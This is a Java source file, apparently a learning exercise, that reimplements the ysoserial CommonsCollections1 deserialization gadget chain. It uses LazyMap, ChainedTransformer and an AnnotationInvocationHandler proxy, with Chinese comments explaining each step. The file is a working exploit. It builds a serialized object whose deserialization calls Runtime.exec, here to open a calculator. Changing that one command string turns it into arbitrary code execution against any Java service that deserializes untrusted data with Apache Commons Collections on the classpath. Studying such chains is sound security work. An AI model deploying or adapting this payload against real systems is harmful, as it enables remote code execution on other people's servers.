package com.xjjlearning.hack.java.ysoserial.payloads;

import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

/**
 * created by xjj on 2023/1/27
 */
// 使用LazyMap来触发gadget
public class CommonCollections1Lazy {

    // 使用jdk8u66执行
    public void gadget() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"open -a Calculator"}
                ),
                new ConstantTransformer(1) // 隐藏告警日志
        };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();

        innerMap.put("value", "xxxx");

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        // 寻找一个东西 执行 AnnotationInvocationHandler的 invoke方法 进而执行LazyMap的get方法 -> 进而想到java动态代理,
        // 碰巧AnnotationInvocationHandler就是个代理 :):) 起两个作用

        // 这个map执行任何方法都将触发我们的 LazyMap::invoke(), 再封装一层给readObject
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class},
                (InvocationHandler) constructor.newInstance(Retention.class, outerMap));

        Object obj = constructor.newInstance(Retention.class, proxyMap);

        Optional<byte[]> b = SerializationUtil.serialize(obj);
        SerializationUtil.deserialize(b);
    }


    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
        new CommonCollections1Lazy().gadget();
    }
}
